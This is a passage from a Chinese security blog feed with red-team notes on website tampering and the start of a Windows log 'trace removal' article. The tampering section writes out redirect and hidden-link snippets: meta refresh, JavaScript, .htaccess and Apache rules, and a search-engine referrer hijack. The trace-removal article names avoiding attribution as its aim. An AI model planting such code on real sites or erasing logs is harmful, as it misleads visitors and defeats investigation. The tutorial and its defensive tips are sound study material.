punctuation\">\"</span>fade<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>登录<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>效果如下：</p>\n<figure><figcaption>img2</figcaption></figure>\n<p>或者直接修改网站原本的跳转链接，例如下面将<strong>我的订单</strong>链接修改为恶意链接：</p>\n<div class=\"language-html\" data-ext=\"html\" data-title=\"html\"><pre class=\"language-html\"><code><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>login fl<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>header-operater<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>/<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>外卖<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token comment\">&lt;!-- &lt;a href=\"/account/order\"&gt;我的订单&lt;/a&gt; --&gt;</span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>链接<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>我的订单<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>    <span class=\"token comment\">&lt;!-- 修改&lt;a&gt;标签的href --&gt;</span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>/about.html?p=lianxiwomen<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>联系我们<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span> \n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">&gt;</span></span> \n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>header-login<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>navBtn f-radius f-select n<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">data-reveal-id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>myModal<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">data-animation</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>fade<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>登录<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>点击<strong>我的订单</strong>即可跳转到恶意网站。</p>\n<p>这种方法过于明显，很容易被管理员或网站用户发现。</p>\n<ul>\n<li><strong>暗链</strong></li>\n</ul>\n<p>暗链是相对于明链来讲的，比如，查看某个网页的源代码，有很多超链接，但在该网页上并没有看见它们。像这种在网站前台看不见，只存在于源代码中的超链接就叫作暗链，它通过各种非正常的手段把链接隐藏了，也叫隐链。</p>\n<p>1）链接位于页面可见范围之外。可以将position位置属性设置成负数，则链接无法显示在可见页面之内。</p>\n<div class=\"language-html\" data-ext=\"html\" data-title=\"html\"><pre class=\"language-html\"><code><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span> <span class=\"token property\">left</span><span class=\"token punctuation\">:</span> -999px<span class=\"token punctuation\">;</span><span class=\"token property\">top</span><span class=\"token punctuation\">:</span> -999px<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>暗链网址/<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>关键词<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span> <span class=\"token property\">top</span><span class=\"token punctuation\">:</span> -999px<span class=\"token punctuation\">;</span><span class=\"token property\">right</span><span class=\"token punctuation\">:</span> -999px<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">herf</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>暗链网址<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>关键词<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>这样在页面上看不出与篡改前有任何区别。</p>\n<p>2）链接块大小设置为0，同样在页面上不显示。</p>\n<div class=\"language-html\" data-ext=\"html\" data-title=\"html\"><pre class=\"language-html\"><code><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 0px<span class=\"token punctuation\">;</span> <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 0px<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">herf</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>暗链网址<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>关键词<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>暗链网址<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">line-height</span><span class=\"token punctuation\">:</span>0px<span class=\"token punctuation\">;</span> <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span>0px<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span>关键词<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>3）利用跑马灯marquee属性，链接以跑马灯形式迅速闪现，跑马灯的长宽设置很小，同时将闪现的频率设置很大，使得查看页面时不会有任何影响。</p>\n<div class=\"language-html\" data-ext=\"html\" data-title=\"html\"><pre class=\"language-html\"><code><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>marquee</span> <span class=\"token attr-name\">height</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>1</span> <span class=\"token attr-name\">width</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>4</span> <span class=\"token attr-name\">scrollamount</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>3000</span> <span class=\"token attr-name\">scrolldelay</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>20000</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>暗链网址<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>关键字<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>marquee</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>4）利用<code>display:none</code>和<code>visibility:hidden</code>隐藏区域里的内容。</p>\n<div class=\"language-html\" data-ext=\"html\" data-title=\"html\"><pre class=\"language-html\"><code><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">display</span><span class=\"token punctuation\">:</span>none<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>暗链网址<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>关键字<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token special-attr\"><span class=\"token attr-name\">styLe</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">visibility</span><span class=\"token punctuation\">:</span>hidden<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span> <span class=\"token punctuation\">\"</span>暗链网址<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>关键字<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>5）链接颜色与背景色相同，链接文字使用低像素。</p>\n<div class=\"language-html\" data-ext=\"html\" data-title=\"html\"><pre class=\"language-html\"><code><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>暗链网址<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">color</span><span class=\"token punctuation\">:</span>#f63440<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span>关键词<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>解决方法：及时对比网站源码与备份源码的区别。</p>\n<h2>3. 源网站劫持</h2>\n<p>1）篡改<code>&lt;meta&gt;</code></p>\n<div class=\"language-html\" data-ext=\"html\" data-title=\"html\"><pre class=\"language-html\"><code><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n\t<span class=\"token comment\">&lt;!-- &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /&gt; --&gt;</span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>refresh<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>1;url=恶意网站链接<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span> \n\t\t\t......\n\t\t\t\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>2）利用JS</p>\n<p>方法1：在<code>&lt;head&gt;</code>种添加如下代码</p>\n<div class=\"language-html\" data-ext=\"html\" data-title=\"html\"><pre class=\"language-html\"><code><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/javascript<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token script\"><span class=\"token language-javascript\">\n\twindow<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"https://www.baidu.com\"</span><span class=\"token punctuation\">;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>方法2：加载js文件</p>\n<p>修改原来的js文件，或者添加一个新的js文件如下，或者加载远程的：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>function Redirect(){\n    window.location.href=\"恶意网站链接\";\n}\nRedirect();\n// 这个文件可以写的复杂一些，例如设置当手机端访问的时候才会跳转\n</code></pre></div><p>再去原网站加载这个文件：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>&lt;script src=\"js文件地址\"&gt;&lt;/script&gt;\n</code></pre></div><p>可以通过抓包查看，是否加载了远程的js文件。对于网站中引入的js文件多注意。</p>\n<p>3）篡改网站根目录的<code>.htaccess</code>文件</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>Options +FollowSymLinks\nRewriteEngine on\nRewriteRule ^(.*)$ 恶意网站链接 [L,R=301]\n</code></pre></div><p>经常查看网站的配置文件，若发现被篡改及时修复。</p>\n<p>4）篡改Apache配置文件（我这里为<code>Apache2.4.39\\conf\\vhosts\\0localhost_80.conf</code>文件）假设公司官网为想要设置的恶意链接：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>RedirectMatch permanent ^/(.*) https://www.hillstonenet.com.cn\n</code></pre></div><p>就相当于phpstudy配置如下：</p>\n<figure><figcaption>img5</figcaption></figure>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>RedirectMatch permanent ^/(.*) https://www.hillstonenet.com.cn/$1\n</code></pre></div><p>相当于phpstudy：</p>\n<figure><figcaption>img4</figcaption></figure>\n<p>上面两种效果一样。</p>\n<h2>4. 搜索引擎劫持</h2>\n<p><code>&lt;head&gt;</code>添加</p>\n<div class=\"language-html\" data-ext=\"html\" data-title=\"html\"><pre class=\"language-html\"><code>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token script\"><span class=\"token language-javascript\">\n        <span class=\"token keyword\">var</span> s <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span>referrer<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"google\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token operator\">||</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"baidu\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href <span class=\"token operator\">=</span> <span class=\"token string\">\"恶意链接\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>当对应的搜索引擎访问时，就会跳转到恶意链接。</p>\n<h2>5. 篡改网站源码备份文件</h2>\n<p>有些攻击者不仅会简单加载JS文件等方法篡改网站，还会篡改网站的的源码备份文件，使得当管理员发现了网站的问题，会使用备份的网站源码重新搭建，网站也会受到影响。例如把webshell文件隐藏在其中，即使网站被重新搭建，攻击者还是能控制网站并篡改。所以备份网站源码时，要异地备份，并尽量备份原生的代码。</p>\n<h2>6. 篡改图片</h2>\n<p>网站首页被恶意篡改，比如复制原来的图片，PS一下，然后替换上去。一般公司网站会贴上公众号的二维码或客服团队的微信二维码，这种图片一旦被篡改，公司客户就很容易收到诈骗团队，冒充公司客服进行诈骗。</p>\n<h2>7. 篡改管理员账号</h2>\n<p>某网站存在sql注入等漏洞，攻击者可以利用SQL语句修改管理员的密码，登录到管理员后台，进行各种操作。</p>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "痕迹清理",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/6-Emergency/TracesRemoval.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/6-Emergency/TracesRemoval.html",
      "summary": "痕迹清理\n1. 引言\n痕迹清理，是清理渗透过程中在目标机器上留下的所有操作痕迹。其主要目的是：避免溯源、隐藏攻击方法。\n需要注意的是：\n\n痕迹清理这个动作本身也会产生痕迹，所以不存在完美的痕迹清理。\n如果目标已经配置，第三方的日志记录平台，本机的痕迹清理作用就不大了，除非可以拿下日志系统的权限。\n\n2. Windows痕迹清理\n2.1 Windows核...",
      "content_html": "\n<h2>1. 引言</h2>\n<p>痕迹清理，是清理渗透过程中在目标机器上留下的所有操作痕迹。其主要目的是：避免溯源、隐藏攻击方法。</p>\n<p>需要注意的是：</p>\n<ul>\n<li><strong>痕迹清理这个动作本身也会产生痕迹</strong>，所以不存在完美的痕迹清理。</li>\n<li>如果目标已经配置，第三方的日志记录平台，本机的痕迹清理作用就不大了，除非可以拿下日志系统的权限。</li>\n</ul>\n<h2>2. Windows痕迹清理</h2>\n<h3>2.1 Windows核心日志相关基础知识</h3>\n<h5>1）3类核心日志</h5>\n<p>Windows的日志文件分为3类核心日志，分别是系统日志，程序日志，和安全日志，如图</p>\n<figure><figcaption>image-20231109171401216</figcaption></figure>\n<p><strong>登录失败：</strong></p>\n<figure><figcaption>image-20231128112011589</figcaption></figure>\n<figure><figcaption>image-20231128112023741</figcaption></figure>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>帐户登录失败。\n\n使用者:\n\t安全 ID:\t\tNULL SID\n\t帐户名:\t\t-\n\t帐户域:\t\t-\n\t登录 ID:\t\t0x0\n\n登录类型:\t\t\t3\n\n登录失败的帐户:\n\t安全 ID:\t\tNULL SID\n\t帐户名:\t\tabcd\n\t帐户域:\t\tHILLSTONENET\n\n失败信息:\n\t失败原因:\t\t未知用户名或密码错误。\n\t状态:\t\t\t0xC000006D\n\t子状态:\t\t0xC000006A\n\n进程信息:\n\t调用方进程 ID:\t0x0\n\t调用方进程名:\t-\n\n网络信息:\n\t工作站名:\tXIAOMENGSONG904\n\t源网络地址:\t10.89.17.170\n\t源端口:\t\t0\n\n详细身份验证信息:\n\t登录进程:\t\tNtLmSsp \n\t身份验证数据包:\tNTLM\n\t传递服务:\t-\n\t数据包名(仅限 NTLM):\t-\n\t密钥长度:\t\t0\n\n登录请求失败时在尝试访问的计算机上生成此事件。\n\n“使用者”字段指明本地系统上请求登录的帐户。这通常是一个服务(例如 Server 服务)或本地进程(例如 Winlogon.exe 或 Services.exe)。\n\n“登录类型”字段指明发生的登录的种类。最常见的类型是 2 (交互式)和 3 (网络)。\n\n“进程信息”字段表明系统上的哪个帐户和进程请求了登录。\n\n“网络信息”字段指明远程登录请求来自哪里。“工作站名”并非总是可用，而且在某些情况下可能会留为空白。\n\n“身份验证信息”字段提供关于此特定登录请求的详细信息。\n\t-“传递服务”指明哪些直接服务参与了此登录请求。\n\t-“数据包名”指明在 NTLM 协议之间使用了哪些子协议。\n\t-“密钥长度”指明生成的会话密钥的长度。如果没有请求会话密钥，则此字段为 0。\n</code></pre></div><p><strong>登录成功：</strong></p>\n<figure><figcaption>image-20231128112115875</figcaption></figure>\n<figure><figcaption>image-20231128112132734</figcaption></figure>\n<figure><figcaption>image-20231128112144294</figcaption></figure>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>已成功登录帐户。\n\n使用者:\n\t安全 ID:\t\tSYSTEM\n\t帐户名称:\t\tDESKTOP-0O9EC2H$\n\t帐户域:\t\tWORKGROUP\n\t登录 ID:\t\t0x3E7\n\n登录信息:\n\t登录类型:\t\t5\n\t受限制的管理员模式:\t-\n\t虚拟帐户:\t\t否\n\t提升的令牌:\t\t是\n\n模拟级别:\t\t模拟\n\n新登录:\n\t安全 ID:\t\tSYSTEM\n\t帐户名称:\t\tSYSTEM\n\t帐户域:\t\tNT AUTHORITY\n\t登录 ID:\t\t0x3E7\n\t链接的登录 ID:\t\t0x0\n\t网络帐户名称:\t-\n\t网络帐户域:\t-\n\t登录 GUID:\t\t{00000000-0000-0000-0000-000000000000}\n\n进程信息:\n\t进程 ID:\t\t0x2ac\n\t进程名称:\t\tC:\\Windows\\System32\\services.exe\n\n网络信息:\n\t工作站名称:\t-\n\t源网络地址:\t-\n\t源端口:\t\t-\n\n详细的身份验证信息:\n\t登录进程:\t\tAdvapi  \n\t身份验证数据包:\tNegotiate\n\t传递的服务:\t-\n\t数据包名(仅限 NTLM):\t-\n\t密钥长度:\t\t0\n\n创建登录会话时，将在被访问的计算机上生成此事件。\n\n“使用者”字段指示本地系统上请求登录的帐户。这通常是一个服务(例如 Server 服务)或本地进程(例如 Winlogon.exe 或 Services.exe)。\n\n“登录类型”字段指示发生的登录类型。最常见的类型是 2 (交互式)和 3 (网络)。\n\n“新登录”字段指示新登录是为哪个帐户创建的，即已登录的帐户。\n\n“网络”字段指示远程登录请求源自哪里。“工作站名称”并非始终可用，并且在某些情况下可能会留空。\n\n“模拟级别”字段指示登录会话中的进程可以模拟到的程度。\n\n“身份验证信息”字段提供有关此特定登录请求的详细信息。\n\t- “登录 GUID”是可用于将此事件与 KDC 事件关联起来的唯一标识符。\n\t-“传递的服务”指示哪些中间服务参与了此登录请求。\n\t-“数据包名”指示在 NTLM 协议中使用了哪些子协议。\n\t-“密钥长度”指示生成的会话密钥的长度。如果没有请求会话密钥，则此字段将为 0。\n</code></pre></div><p>可以查看事件属性：</p>\n<figure><figcaption>image-20231113132536818</figcaption></figure>\n<p>详细信息：</p>\n<figure><figcaption>image-20231113132603403</figcaption></figure>\n<p>具体含义参见<a href=\"https://blog.csdn.net/diyiday/article/details/133831752\" target=\"_blank\" rel=\"noopener noreferrer\">【Windows日志】记录系统事件的日志_系统访问日志记录-CSDN博客</a></p>\n<p><strong>日志在注册表的键：</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>HKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\Eventlog\n</code></pre></div><p>**系统日志 (SysEvent)：**记录操作系统产生的事件，如设备驱动无法正常启动或停止，系统进程崩溃等，默认位置</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>%SystemRoot%\\System32\\Winevt\\Logs\\System.evtx\n</code></pre></div><p>**程序日志 (AppEvent)：**包含操作应用程序软件相关的事件。事件包括了错误、警告及任何应用程序需要报告的信息。默认位置:</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx\n</code></pre></div><p>**安全日志 (SecEvent)：**包含安全性相关的事件。e.g. 用户权限变更，登录及注销，文件 / 文件夹访问等信息。默认位置:</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx\n</code></pre></div><p>常见的安全事件ID：</p>\n<p>| 事件ID | 说明                            |\n|</p>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "BurpSuite使用手册",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/Burpsuite.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/Burpsuite.html",
      "summary": "BurpSuite使用手册\nBurpSuite是什么\n\n直接使用 请从[3. Proxy](#3. Proxy)部分开始阅读\n\nBurpSuite是一款使用Java编写的，用于Web安全审计与扫描套件。它集成了诸多实用的小工具以完成http请求的转发/修改/扫描等，同时这些小工具之间还可以互相协作，在BurpSuite这个框架下进行各种强大的，可订制的...",
